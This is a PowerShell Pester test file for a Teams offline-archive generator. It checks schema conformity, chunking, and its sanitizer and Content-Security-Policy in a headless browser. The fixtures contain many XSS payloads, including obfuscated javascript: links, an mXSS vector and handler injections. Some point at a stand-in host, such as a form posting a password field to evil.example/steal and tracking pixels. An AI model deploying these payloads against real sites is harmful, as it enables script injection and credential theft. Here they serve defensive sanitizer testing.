#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '5.0.0' }
<#
    The Teams-like viewer and the offline HTML archive (Mode Archive). Offline, deterministic.
      - generator: structure of the folder / single-file archive, schema conformity, chunking, scopes, budget, content rewriting
      - sanitizer + CSP: run in a REAL browser engine (Edge or Chrome, headless, DevTools protocol on localhost) with the Tiny tenant's
        XSS payloads plus extra ones: nothing may execute, nothing may be fetched
      - virtualization: a 200 000 message conversation must open fast with a small DOM
    Browser tests are skipped with a message when no Edge/Chrome is installed.
#>
. (Join-Path $PSScriptRoot 'support\BrowserHarness.ps1')
$script:BrowserExe = Find-TestBrowser

BeforeDiscovery {
    . (Join-Path $PSScriptRoot 'support\BrowserHarness.ps1')
    $script:HasBrowser = [bool](Find-TestBrowser)
    if (-not $script:HasBrowser) { Write-Warning 'No Edge/Chrome found: the browser based preview tests (sanitizer, CSP, virtualization) are SKIPPED.' }
}

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    . (Join-Path $PSScriptRoot 'support\BrowserHarness.ps1')
    $script:Schema = Get-Content -LiteralPath (Join-Path $script:PackageRoot 'schemas\preview-v1.schema.json') -Raw
    $script:SchemaObj = $script:Schema | ConvertFrom-Json -AsHashtable

    function Get-PartSchema([string]$Name) {
        $o = [ordered]@{ '$schema' = $script:SchemaObj['$schema']; '$ref' = "#/definitions/$Name"; definitions = $script:SchemaObj['definitions'] }
        $o | ConvertTo-Json -Depth 50
    }
    function Get-Manifest([string]$IndexHtml) {
        $m = [regex]::Match((Get-Content -LiteralPath $IndexHtml -Raw), 'id="tt-manifest">(.*?)</script>', 'Singleline')
        $m.Groups[1].Value
    }
    function Get-ChunkJson([string]$JsFile) {
        $t = Get-Content -LiteralPath $JsFile -Raw
        $i = $t.IndexOf(',['); $j = $t.LastIndexOf(');')
        $t.Substring($i + 1, $j - $i - 1)
    }
    function Get-FileUrl([string]$Path) { ([Uri]$Path).AbsoluteUri }

    # ---- tenants -----------------------------------------------------------------------------------------------------------------
    $script:Demo = [TeamsTransfer.Testing.SyntheticTenant]::Demo()
    $script:DemoReader = [TeamsTransfer.Testing.MemoryStoreReader]::new($script:Demo)
    $script:Tiny = [TeamsTransfer.Testing.SyntheticTenant]::Tiny(7)
    # extra hostile messages in the Tiny tenant, on top of its own edge cases
    $evil = $script:Tiny.AddUser('<img src=x onerror=window.__pwned=\"name\">@contoso.com', '<img src=x onerror="window.__pwned=''name''"> Mallory')
    $chat = $script:Tiny.Chats | Where-Object Topic -like 'Edge cases*' | Select-Object -First 1
    $script:EdgeChatId = $chat.Id
    $when = ($chat.Messages | Measure-Object CreatedMs -Maximum).Maximum + 600000
    $payloads = @(
        '<img src=x onerror="window.__pwned=''img''">',
        '<svg onload="window.__pwned=''svg''"><script>window.__pwned=''svgscript''</script><circle r=5 /></svg>after-svg',
        '<a href="jav&#x09;ascript:window.__pwned=''a1''">tab</a> <a href="&#106;avascript:window.__pwned=''a2''">ent</a> <a href="data:text/html,<script>window.__pwned=1</script>">data</a> <a href="vbscript:msgbox(1)">vb</a> <a href=" JaVaScRiPt:window.__pwned=1">case</a>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=window.__pwned=''mxss''&gt;">mxss',
        '<div style="background:url(javascript:window.__pwned=1);width:expression(window.__pwned=1)" onmouseover="window.__pwned=''ov''">hover</div>',
        '<body onload="window.__pwned=''body''"><p>inside body</p></body>',
        '<iframe srcdoc="<script>parent.__pwned=''iframe''</script>"></iframe><object data="javascript:window.__pwned=1"></object><embed src="https://evil.example/x.swf">after-frames',
        '<form action="https://evil.example/steal"><input name=pw autofocus onfocus="window.__pwned=''focus''"><button formaction="https://evil.example/x">go</button></form>after-form',
        '<meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">after-head',
        '<img src="https://evil.example/track.png" alt="remote"> <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=" alt="datasvg"> <img src="https://graph.microsoft.com/v1.0/chats/zz/messages/1/hostedContents/QUJD/$value" alt="graph">',
        '<style>@import url(https://evil.example/x.css); body{display:none}</style>after-style',
        '<details open ontoggle="window.__pwned=''toggle''">d</details><p onclick="window.__pwned=''click''" onpointerover="window.__pwned=''pov''">click me</p>',
        ('<div>' * 3000) + 'deep' + ('</div>' * 3000),
        '<a href="https://fabrikam.com/ok?a=1&amp;b=2" onclick="window.__pwned=1">good link</a> <a href="mailto:a@b.c">mail</a> <a href="//evil.example/x">proto-relative</a>'
    )
    $author = $script:Tiny.Users[0]
    foreach ($p in $payloads) {
        $m = [TeamsTransfer.Testing.FakeMessage]::new(); $m.CreatedMs = $when; $m.ModifiedMs = $when; $m.AuthorOrd = $author.Ordinal
        $m.Ext().Body = $p; [void]$chat.AddUnique($m); $when += 1000
    }
    $mt = [TeamsTransfer.Testing.FakeMessage]::new(); $mt.CreatedMs = $when; $mt.ModifiedMs = $when; $mt.AuthorOrd = $evil.Ordinal; $mt.Flags = [TeamsTransfer.Testing.FakeMessage]::FlagText
    $mt.Ext().Body = '<script>window.__pwned="plain"</script><img src=x onerror="window.__pwned=1">'; [void]$chat.AddUnique($mt); $when += 1000
    $ma = [TeamsTransfer.Testing.FakeMessage]::new(); $ma.CreatedMs = $when; $ma.ModifiedMs = $when; $ma.AuthorOrd = $evil.Ordinal
    $ma.Ext().Body = '<p>attachments with hostile names</p>'
    $att = [TeamsTransfer.Testing.FakeAttachment]::new(); $att.Id = 'a1'; $att.ContentType = 'reference'; $att.Name = '"><script>window.__pwned="file"</script>.docx'; $att.ContentUrl = 'https://x.sharepoint.com/nothing'
    $card = [TeamsTransfer.Testing.FakeAttachment]::new(); $card.Id = 'a2'; $card.ContentType = 'application/vnd.microsoft.card.adaptive'
    $card.Content = '{"type":"AdaptiveCard","body":[{"type":"TextBlock","text":"<img src=x onerror=window.__pwned=''card''>"},{"type":"Image","url":"https://evil.example/pixel.png"}],"actions":[{"type":"Action.OpenUrl","title":"go","url":"javascript:window.__pwned=1"}]}'
    $ma.Ext().Attachments = @($att, $card); [void]$chat.AddUnique($ma); $when += 1000
    $mch = $script:Tiny.Teams[0].Channels[0]
    $mp = [TeamsTransfer.Testing.FakeMessage]::new(); $mp.CreatedMs = ($mch.Messages | Measure-Object CreatedMs -Maximum).Maximum + 60000; $mp.ModifiedMs = $mp.CreatedMs; $mp.AuthorOrd = $author.Ordinal
    $mp.Ext().Subject = '<script>window.__pwned="subject"</script><b>subj</b>'; $mp.Ext().Body = '<p>post</p>'; [void]$mch.AddUnique($mp)
    foreach ($c in $script:Tiny.Chats) { $c.Touch() }
    $script:TinyReader = [TeamsTransfer.Testing.MemoryStoreReader]::new($script:Tiny)

    $script:Out = Join-Path $TestDrive 'out'
    New-Item -ItemType Directory -Path $script:Out | Out-Null
    $script:DemoFolder = Join-Path $script:Out 'demo'
    $script:DemoResult = Export-TmtArchive -Store $script:DemoReader -OutputPath $script:DemoFolder -Users 'camille.martin@contoso.com'
}

AfterAll { try { Stop-TestBrowser } catch { } }

Describe 'Archive generator: folder archive' {
    It 'writes index.html, data, search and content folders' {
        Test-Path (Join-Path $script:DemoFolder 'index.html') | Should -BeTrue
        (Get-ChildItem (Join-Path $script:DemoFolder 'data') -Recurse -Filter *.js).Count | Should -Be $script:DemoResult.Chunks
        (Get-ChildItem (Join-Path $script:DemoFolder 'search') -Filter *.js).Count | Should -BeGreaterThan 0
        $script:DemoResult.Mode | Should -Be 'folder'
        $script:DemoResult.Conversations | Should -Be 9
        $script:DemoResult.Messages | Should -Be 47
    }
    It 'copies exported hosted images and files to content\<sha256>.<ext>' {
        $content = Get-ChildItem (Join-Path $script:DemoFolder 'content')
        $content.Count | Should -Be 5   # 2 pictures + 3 files
        $content.Name | ForEach-Object { $_ | Should -Match '^[0-9a-f]{64}\.(png|pdf|xlsx|docx)$' }
        $script:DemoResult.ImagesMissing | Should -Be 0
        $script:DemoResult.FilesExported | Should -Be 3
        (Get-ChildItem (Join-Path $script:DemoFolder 'content') -Filter *.png).Count | Should -Be 2   # the same picture posted twice is stored once
    }
    It 'manifest conforms to preview-v1.schema.json' {
        $json = Get-Manifest (Join-Path $script:DemoFolder 'index.html')
        Test-Json -Json $json -Schema $script:Schema | Should -BeTrue
        $m = $json | ConvertFrom-Json
        $m.schema | Should -Be 'preview-v1'
        $m.mode | Should -Be 'folder'
        $m.viewer | Should -Not -BeNullOrEmpty
        $m.users[$m.viewer].u | Should -Be 'camille.martin@contoso.com'
        $m.stats.messages | Should -Be 47
        @($m.conversations | Where-Object kind -eq 'channel').Count | Should -Be 5
        @($m.conversations | Where-Object membership -eq 'private').Count | Should -Be 1
        @($m.conversations | Where-Object membership -eq 'shared').Count | Should -Be 1
    }
    It 'every chunk and search file conforms to the schema and matches the manifest counts' {
        $m = (Get-Manifest (Join-Path $script:DemoFolder 'index.html')) | ConvertFrom-Json
        $chunkSchema = Get-PartSchema 'chunk'; $searchSchema = Get-PartSchema 'search'
        $total = 0
        foreach ($c in $m.conversations) {
            $convMsgs = 0
            foreach ($ch in $c.chunks) {
                $file = Join-Path $script:DemoFolder ($ch.f -replace '/', '\')
                Test-Path $file | Should -BeTrue
                $json = Get-ChunkJson $file
                Test-Json -Json $json -Schema $chunkSchema | Should -BeTrue
                $arr = $json | ConvertFrom-Json -NoEnumerate
                $arr.Count | Should -Be $ch.m
                @($arr | Where-Object { -not $_.r }).Count | Should -Be $ch.n
                $convMsgs += $arr.Count
            }
            $convMsgs | Should -Be $c.count
            $total += $convMsgs
            if ($c.search) {
                $t = Get-Content (Join-Path $script:DemoFolder ($c.search -replace '/', '\')) -Raw
                $sj = $t.Substring($t.IndexOf(',{') + 1, $t.LastIndexOf(');') - $t.IndexOf(',{') - 1)
                Test-Json -Json $sj -Schema $searchSchema | Should -BeTrue
            }
        }
        $total | Should -Be 47
    }
    It 'rewrites image sources to local content references and never keeps a remote URL' {
        $all = (Get-ChildItem (Join-Path $script:DemoFolder 'data') -Recurse -Filter *.js | Get-Content -Raw) -join "`n"
        $all | Should -Not -Match 'graph\.microsoft\.com'
        $all | Should -Match 'tt:[0-9a-f]{64}\.png'
    }
    It 'the page has no remote reference, a strict CSP and the script hash matches' {
        $html = Get-Content (Join-Path $script:DemoFolder 'index.html') -Raw
        $html | Should -Not -Match '<script[^>]+src='
        $html | Should -Not -Match '<link\b'
        $html | Should -Not -Match '@import'
        $html | Should -Not -Match 'url\(\s*["'']?https?:'
        $csp = [regex]::Match($html, 'http-equiv="Content-Security-Policy" content="([^"]+)"').Groups[1].Value -replace '&#39;', "'"
        $csp | Should -Match "default-src 'none'"
        $csp | Should -Match "connect-src 'none'"
        $csp | Should -Match "img-src 'self' data: blob:"
        $csp | Should -Not -Match 'unsafe-inline|unsafe-eval|https?:|\*'
        $script = [regex]::Matches($html, '<script>(.*?)</script>', 'Singleline') | ForEach-Object { $_.Groups[1].Value } | Select-Object -Last 1
        $hash = [Convert]::ToBase64String([Security.Cryptography.SHA256]::HashData([Text.Encoding]::UTF8.GetBytes($script)))
        $csp | Should -Match ([regex]::Escape("'sha256-$hash'"))
        $style = [regex]::Match($html, '<style>(.*?)</style>', 'Singleline').Groups[1].Value
        $csp | Should -Match ([regex]::Escape("'sha256-" + [Convert]::ToBase64String([Security.Cryptography.SHA256]::HashData([Text.Encoding]::UTF8.GetBytes($style))) + "'"))
    }
    It 'shows hosted contents that were not exported as missing (placeholder), never as a remote image' {
        $reader = [TeamsTransfer.Testing.MemoryStoreReader]::new($script:Demo); $reader.ExportHostedContents = $false
        $out = Join-Path $script:Out 'nohosted'
        $r = Export-TmtArchive -Store $reader -OutputPath $out -Users 'camille.martin@contoso.com'
        $r.Images | Should -BeGreaterThan 0
        $r.ImagesMissing | Should -Be $r.Images
        ((Get-ChildItem $out -Recurse -Filter *.js | Get-Content -Raw) -join '') | Should -Match 'tt:missing'
    }
}

Describe 'Archive generator: scopes, viewer, chunking, single file' {
    It 'scopes by user, by conversation keys and by team' {
        $byUser = Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-user') -Users 'nicolas.petit@contoso.com'
        $byUser.Conversations | Should -Be 6        # not in the 1:1 chats Camille/Julien and Camille/Sophie, nor in the shared channel
        $key = ($script:DemoReader.ListConversations() | Where-Object Topic -eq 'Weekly product team sync').Key
        $byKey = Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-key') -Conversation $key
        $byKey.Conversations | Should -Be 1
        $byKey.Messages | Should -Be 6
        $team = ($script:DemoReader.ListConversations() | Where-Object TeamId | Select-Object -First 1).TeamId
        $byTeam = Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-team') -Teams $team
        $byTeam.Conversations | Should -Be 5
        $m = (Get-Manifest (Join-Path $script:Out 's-team\index.html')) | ConvertFrom-Json
        ($m.conversations | Where-Object kind -ne 'channel') | Should -BeNullOrEmpty
        $m.viewer | Should -BeNullOrEmpty
        { Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-bad') -Users 'nobody@contoso.com' } | Should -Throw
    }
    It 'uses -Viewer for the right-hand side (independently of -User)' {
        $r = Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-viewer') -Users 'camille.martin@contoso.com' -Viewer 'julien.lefevre@contoso.com' 
        $m = (Get-Manifest (Join-Path $script:Out 's-viewer\index.html')) | ConvertFrom-Json
        $m.users[$m.viewer].u | Should -Be 'julien.lefevre@contoso.com'
        $m.language | Should -Be 'en'
    }
    It 'titles the archive with the display name of the user, whatever the case of the UPN' {
        [void](Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-title') -Users 'CAMILLE.Martin@Contoso.COM')
        $m = (Get-Manifest (Join-Path $script:Out 's-title\index.html')) | ConvertFrom-Json
        $m.title | Should -Be 'Teams archive - Camille Martin'
        $m.language | Should -Be 'en'
        $m.users[$m.viewer].u | Should -Be 'camille.martin@contoso.com'
        (Get-Content (Join-Path $script:Out 's-title\index.html') -Raw) | Should -Match '<title>Teams archive - Camille Martin</title>'
    }
    It 'records the accent in the manifest: House by default, Teams on request, and the page applies it' {
        [void](Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-house') -Users 'camille.martin@contoso.com')
        $m = (Get-Manifest (Join-Path $script:Out 's-house\index.html')) | ConvertFrom-Json
        $m.accent | Should -Be 'House'
        [void](Export-TmtArchive -Store $script:DemoReader -OutputPath (Join-Path $script:Out 's-accent') -Users 'camille.martin@contoso.com' -Accent Teams)
        ((Get-Manifest (Join-Path $script:Out 's-accent\index.html')) | ConvertFrom-Json).accent | Should -Be 'Teams'
        Test-Json -Json (Get-Manifest (Join-Path $script:Out 's-accent\index.html')) -Schema $script:Schema | Should -BeTrue
    }

    It 'splits a conversation by month and by MaxItemsPerChunk without cutting a channel thread' {
        $r = Export-TmtArchive -Store $script:TinyReader -OutputPath (Join-Path $script:Out 'chunks') -MaxItemsPerChunk 50
        $m = (Get-Manifest (Join-Path $script:Out 'chunks\index.html')) | ConvertFrom-Json
        $multi = $m.conversations | Where-Object { $_.chunks.Count -gt 1 }
        $multi | Should -Not -BeNullOrEmpty
        foreach ($c in $m.conversations) {
            $prevB = 0
            foreach ($ch in $c.chunks) {
                $ch.n | Should -BeLessOrEqual 50
                $ch.a | Should -BeGreaterOrEqual $prevB
                $ch.b | Should -BeGreaterOrEqual $ch.a
                $prevB = $ch.b
                (Get-Item (Join-Path $script:Out ('chunks\' + ($ch.f -replace '/', '\')))).Length | Should -BeGreaterThan 0
            }
        }
        $edge = $m.conversations | Where-Object title -like 'Edge cases*'
        $edge.count | Should -BeGreaterThan 40
        $edge.chunks.Count | Should -BeGreaterOrEqual 1
    }
    It 'writes one self-contained file with embedded compressed chunks and images (-SingleFile)' {
        $file = Join-Path $script:Out 'single\demo.html'
        $r = Export-TmtArchive -Store $script:DemoReader -OutputPath $file -Users 'camille.martin@contoso.com' -SingleFile
        $r.Mode | Should -Be 'single'
        (Get-ChildItem (Split-Path $file)).Count | Should -Be 1
        $html = Get-Content $file -Raw
        ([regex]::Matches($html, '<script type="application/x-tt-gzip" id="[ds]-c')).Count | Should -Be ($r.Chunks + $r.Conversations)   # chunks + one search block per conversation
        ([regex]::Matches($html, '<script type="application/x-tt-content" id="i-')).Count | Should -Be 5
        $m = (Get-Manifest $file) | ConvertFrom-Json
        $m.mode | Should -Be 'single'
        Test-Json -Json (Get-Manifest $file) -Schema $script:Schema | Should -BeTrue
        $m.conversations[0].chunks[0].f | Should -Match '^d-c\d+-\d+$'
        # a block decompresses to schema valid JSON
        $b = [regex]::Match($html, '<script type="application/x-tt-gzip" id="d-c1-0">([^<]+)</script>').Groups[1].Value
        $gz = [IO.Compression.GZipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($b)), [IO.Compression.CompressionMode]::Decompress)
        $txt = [IO.StreamReader]::new($gz).ReadToEnd()
        Test-Json -Json $txt -Schema (Get-PartSchema 'chunk') | Should -BeTrue
    }
    It 'honours the single-file content budget: over budget images and files become "not embedded"' {
        $file = Join-Path $script:Out 'single\nobudget.html'
        $r = Export-TmtArchive -Store $script:DemoReader -OutputPath $file -Users 'camille.martin@contoso.com' -SingleFile -ContentBudgetMB 0
        $html = Get-Content $file -Raw
        ([regex]::Matches($html, '<script type="application/x-tt-content" id="i-')).Count | Should -Be 0
        $r.ContentBytes | Should -Be 0
        $r.FilesExported | Should -Be 0
        (Get-Item $file).Length | Should -BeLessThan (Get-Item (Join-Path $script:Out 'single\demo.html')).Length
        $all = ([regex]::Matches($html, 'id="d-c\d+-\d+">([^<]+)<') | ForEach-Object { $b = $_.Groups[1].Value; [IO.StreamReader]::new([IO.Compression.GZipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($b)), [IO.Compression.CompressionMode]::Decompress)).ReadToEnd() }) -join "`n"
        $all | Should -Match '"st":"notembedded"'
    }
}

Describe 'Archive in a browser: sanitizer, CSP, no remote access' -Skip:(-not $script:HasBrowser) {
    BeforeAll {
        $script:Tiny1 = Join-Path $script:Out 'tiny-folder'
        $script:Tiny2 = Join-Path $script:Out 'tiny-single.html'
        $script:Title = 'XSS test archive'
        [void](Export-TmtArchive -Store $script:TinyReader -OutputPath $script:Tiny1 -Title $script:Title)
        [void](Export-TmtArchive -Store $script:TinyReader -OutputPath $script:Tiny2 -SingleFile -Title $script:Title)
        $m = (Get-Manifest (Join-Path $script:Tiny1 'index.html')) | ConvertFrom-Json
        $script:EdgeConv = ($m.conversations | Where-Object title -like 'Edge cases*').id
        $script:ChannelConvs = @($m.conversations | Where-Object kind -eq 'channel')
        [void](Start-TestBrowser -Width 1440 -Height 900)
    }
    AfterAll { Stop-TestBrowser }

    Context 'sanitizer unit tests (in the page)' {
        BeforeAll {
            Set-TestViewport -Width 1440 -Height 900
            Open-TestPage -Url ((Get-FileUrl (Join-Path $script:Tiny1 'index.html'))) | Out-Null
            function Invoke-Sanitize([string]$Html, [string]$Ctx = 'null') {
                $js = 'TT.api.sanitizeToString(' + ($Html | ConvertTo-Json -Compress) + ', ' + $Ctx + ')'
                Get-TestValue $js
            }
            $script:Sha = ('ab' * 32)
        }
        It 'keeps the allow-listed formatting' {
            Invoke-Sanitize '<p>a <b>b</b> <i>i</i> <u>u</u> <s>s</s> <sub>x</sub><sup>2</sup></p><ul><li>one</li></ul><blockquote>q</blockquote><pre><code>c</code></pre><h3>h</h3><hr>' |
                Should -Be '<p>a <b>b</b> <i>i</i> <u>u</u> <s>s</s> <sub>x</sub><sup>2</sup></p><ul><li>one</li></ul><blockquote>q</blockquote><pre><code>c</code></pre><h3>h</h3><hr>'
        }
        It 'drops script, style, iframe, object, embed, form, svg, math WITH their content' {
            foreach ($t in 'script', 'style', 'iframe', 'object', 'form', 'svg', 'math', 'template', 'noscript') {
                $inner = if ($t -in 'svg', 'math') { '<g>SECRET</g>' } else { 'SECRET<b>inner</b>' }   # a <b> inside <svg> legitimately breaks out of foreign content
                $r = Invoke-Sanitize "<p>before</p><$t>$inner</$t><p>after</p>"
                $r | Should -Be '<p>before</p><p>after</p>' -Because $t
            }
        }
        It 'drops void embedding elements' {
            Invoke-Sanitize '<p>a</p><embed src="https://evil.example/x.swf"><p>b</p>' | Should -Be '<p>a</p><p>b</p>'
        }
        It 'unwraps unknown benign tags and keeps their text' {
            Invoke-Sanitize '<font color="red">t</font><center>c</center><attachment id="x"></attachment>' | Should -Be 'tc'
        }
        It 'removes every on* handler, style, class, id and data attribute' {
            $r = Invoke-Sanitize '<p onclick="x()" style="color:red" class="k" id="i" data-a="1" onmouseover="y()" title="t">text</p>'
            $r | Should -Be '<p>text</p>'
        }
        It 'keeps only http, https and mailto links, with rel noopener noreferrer and target _blank' {
            $ok = Invoke-Sanitize '<a href="https://fabrikam.com/p?a=1&amp;b=2" onclick="x()">l</a>'
            $ok | Should -Match 'href="https://fabrikam\.com/p\?a=1&amp;b=2"'
            $ok | Should -Match 'rel="noopener noreferrer"'
            $ok | Should -Match 'target="_blank"'
            $ok | Should -Not -Match 'onclick'
            Invoke-Sanitize '<a href="mailto:a@b.c">m</a>' | Should -Match 'href="mailto:a@b\.c"'
            foreach ($bad in 'javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'jav&#x09;ascript:alert(1)', '&#106;avascript:alert(1)', 'data:text/html,<b>x</b>', 'vbscript:x', 'file:///c:/x', '//evil.example/x', '/relative', 'ftp://x/y', 'blob:https://x/y') {
                $r = Invoke-Sanitize ('<a href="' + $bad + '">x</a>')
                $r | Should -Not -Match 'href' -Because $bad
                $r | Should -Be '<span>x</span>' -Because $bad
            }
        }
        It 'only allows rewritten local content references as image sources' {
            $ctx = '{img: function(r){ return "content/" + r; }}'
            Invoke-Sanitize "<img src=`"tt:$($script:Sha).png`" alt=`"a`" width=`"30`" height=`"20`" onerror=`"x()`">" $ctx | Should -Be "<img class=`"inl`" src=`"content/$($script:Sha).png`" alt=`"a`" width=`"30`" height=`"20`">"
            foreach ($bad in 'https://evil.example/x.png', 'http://x/y.gif', 'data:image/png;base64,AAAA', 'data:image/svg+xml;base64,PHN2Zz4=', 'javascript:x', 'blob:https://x/1', 'x', 'tt:../../etc/passwd', 'tt:abc.png', "tt:$($script:Sha).png/../x", 'tt:missing', 'tt:remote') {
                $r = Invoke-Sanitize ('<img src="' + $bad + '" alt="x">') $ctx
                $r | Should -Not -Match '<img' -Because $bad
                $r | Should -Match 'imgx'
            }
        }
        It 'renders mentions, emoji and table spans, keeps dir for right-to-left text' {
            Invoke-Sanitize '<at id="0">Camille</at>' | Should -Be '<span class="mention">Camille</span>'
            Invoke-Sanitize '<emoji id="smile" alt="😀" title="x"></emoji>' | Should -Be '😀'
            Invoke-Sanitize '<table><thead><tr><th colspan="2" onclick="x()">h</th></tr></thead><tbody><tr><td rowspan="2">a</td><td colspan="99999">b</td></tr></tbody></table>' |
                Should -Be '<table><thead><tr><th colspan="2">h</th></tr></thead><tbody><tr><td rowspan="2">a</td><td>b</td></tr></tbody></table>'
            Invoke-Sanitize '<p dir="rtl">مرحبا</p><p dir="evil">x</p>' | Should -Be '<p dir="rtl">مرحبا</p><p>x</p>'
        }
        It 'survives mutation-XSS vectors and unbalanced markup' {
            $r = Invoke-Sanitize '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">'
            $r | Should -Not -Match 'onerror=alert'
            $r | Should -Not -Match '<img'
            Invoke-Sanitize '<b><i>unclosed <p>text' | Should -Match 'text'
            Invoke-Sanitize '<<script>alert(1)//<</script>' | Should -Not -Match '<script'
        }
        It 'bounds absurd nesting' {
            $r = Invoke-Sanitize (('<div>' * 5000) + 'x' + ('</div>' * 5000))
            $r.Length | Should -BeLessThan 20000
        }
    }

    if ($true) {
        Context 'XSS payloads of the Tiny tenant rendered in the <_> archive' -ForEach @('folder', 'single') {
            BeforeAll {
                $script:Mode = $_
                $page = if ($_ -eq 'folder') { Join-Path $script:Tiny1 'index.html' } else { $script:Tiny2 }
                Set-TestViewport -Width 1440 -Height 14000
                Open-TestPage -Url ((Get-FileUrl $page) + '#c=' + $script:EdgeConv) | Out-Null
                Wait-TestPage 'TT.api.stats().rendered > 5 && !document.querySelector("#rows .skel")' -TimeoutSec 30 | Out-Null
                Start-Sleep -Milliseconds 800
                $script:Pwned = Get-TestValue 'String(window.__pwned)'
                $script:Rendered = Get-TestValue 'TT.api.stats().rendered'
            }
            It 'rendered the whole hostile conversation' { $script:Rendered | Should -BeGreaterThan 40 }
            It 'ran no script: window.__pwned is undefined and the title is intact' {
                $script:Pwned | Should -Be 'undefined'
                Get-TestValue 'document.title' | Should -Be $script:Title
                $script:Cdp.Dialogs.Count | Should -Be 0
            }
            It 'rendered messages contain no dangerous element, no event handler attribute, no style attribute' {
                Get-TestValue 'document.querySelectorAll("#rows script, #rows iframe, #rows object, #rows embed, #rows form, #rows style, #rows link, #rows meta, #rows base, #rows svg, #rows math, #rows input, #rows button.x").length' | Should -Be 0
                Get-TestValue '(function(){var bad=[];document.querySelectorAll("#rows *").forEach(function(e){for(var i=0;i<e.attributes.length;i++){var n=e.attributes[i].name; if(/^on/i.test(n)||n==="srcdoc"||n==="formaction"||n==="action"||(n==="style"&&e.closest(".body"))) bad.push(e.tagName+"@"+n);}});return bad.join(",");})()' | Should -Be ''
            }
            It 'links are http, https or mailto with rel noopener noreferrer and target _blank' {
                $bad = Get-TestValue '(function(){var bad=[];document.querySelectorAll("#rows .body a").forEach(function(a){var h=a.getAttribute("href")||"";if(!/^(https?:|mailto:)/i.test(h)||a.rel!=="noopener noreferrer"||a.target!=="_blank")bad.push(h);});return bad.join("|");})()'
                $bad | Should -Be ''
                (Get-TestValue 'document.querySelectorAll("#rows .body a").length') | Should -BeGreaterThan 2
            }
            It 'images are local (relative content path or blob), remote and data images are placeholders' {
                $imgs = Get-TestValue '(function(){var r=[];document.querySelectorAll("#rows .body img").forEach(function(i){r.push(i.getAttribute("src"));});return JSON.stringify(r);})()' | ConvertFrom-Json
                foreach ($s in $imgs) { $s | Should -Match '^(content/[0-9a-f]{64}\.(png|jpg|gif|webp|bmp)|blob:.+)$' }
                (Get-TestValue 'document.querySelectorAll("#rows .imgx").length') | Should -BeGreaterThan 2
            }
            It 'made no network request outside the page itself' {
                $reqs = @(Get-TestRequests)
                ($reqs | Where-Object { $_ -match '^https?:' }) | Should -BeNullOrEmpty
                ($reqs -match 'evil\.example') | Should -BeNullOrEmpty
            }
            It 'shows hostile names and subjects as text' {
                $txt = Get-TestValue 'document.getElementById("rows").textContent'
                $txt | Should -Match 'Mallory'
                $txt | Should -Match 'window\.__pwned="file"'
                (Get-TestValue 'document.querySelectorAll("#rows img[onerror]").length') | Should -Be 0
            }
            It 'has the CSP meta tag and the browser enforces it (inline script, remote image and fetch are refused)' {
                Get-TestValue 'document.querySelector(''meta[http-equiv="Content-Security-Policy"]'').content' | Should -Match "script-src 'sha256-"
                Get-TestValue '(function(){var s=document.createElement("script");s.textContent="window.__csp=1";document.head.appendChild(s);return String(window.__csp);})()' | Should -Be 'undefined'
                Get-TestValue 'new Promise(function(r){var i=new Image();i.onload=function(){r("loaded")};i.onerror=function(){r("blocked")};i.src="https://evil.example/pixel.png"})' | Should -Be 'blocked'
                Get-TestValue 'fetch("https://evil.example/x").then(function(){return "fetched"},function(){return "blocked"})' | Should -Be 'blocked'
                Start-Sleep -Milliseconds 300
                $log = (Get-TestConsole) -join "`n"
                $log | Should -Match 'Content Security Policy'
                $log | Should -Match "(?i)(Refused to load the image|img-src)"
                $log | Should -Match "(?i)(Refused to connect|connect-src)"
            }        }
    }

    Context 'UI behaviours (keyboard, theme, language, search, jump)' {
        BeforeAll {
            Set-TestViewport -Width 1440 -Height 900
            Open-TestPage -Url ((Get-FileUrl (Join-Path $script:DemoFolder 'index.html')) + '#c=c2') | Out-Null
            Wait-TestPage 'TT.api.stats().rendered > 3 && !document.querySelector("#rows .skel")' | Out-Null
        }
        It 'shows bubbles, mine on the right, with day separators, reactions, file cards and mentions' {
            Get-TestValue 'document.querySelectorAll("#rows .daysep").length' | Should -BeGreaterThan 2
            Get-TestValue 'document.querySelectorAll("#rows .row.mine").length' | Should -BeGreaterThan 0
            Get-TestValue 'document.querySelectorAll("#rows .row.theirs").length' | Should -BeGreaterThan 3
            Get-TestValue 'document.querySelectorAll("#rows .rx span").length' | Should -BeGreaterThan 3
            Get-TestValue 'document.querySelectorAll("#rows .bubble.deleted").length' | Should -Be 1
            Get-TestValue 'document.querySelectorAll("#rows .mention").length' | Should -Be 1
            Get-TestValue 'document.querySelector("#chead .badge").textContent' | Should -Be 'Group'
        }
        It 'shows dates as yyyy-MM-dd (never dd/MM vs MM/dd) in the stamp, header and tooltips' {
            Get-TestValue 'document.getElementById("cfoot").textContent' | Should -Match 'Exported on \d{4}-\d{2}-\d{2}'
            Get-TestValue 'document.querySelector("#chead .sub").textContent' | Should -Match 'from \d{4}-\d{2}-\d{2} to \d{4}-\d{2}-\d{2}'
            Get-TestValue 'document.querySelector("#rows time").title' | Should -Match '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}  \(UTC '
        }
        It 'keeps every text at WCAG contrast >= 4.5:1 in light and dark (top bar, list, cards, pills, system lines)' {
            $js = @"
(function(){
  function parse(c){var m=/rgba?\(([^)]+)\)/.exec(c);if(!m)return null;var p=m[1].split(/[ ,\/]+/).filter(Boolean).map(Number);return {r:p[0],g:p[1],b:p[2],a:p.length>3?p[3]:1};}
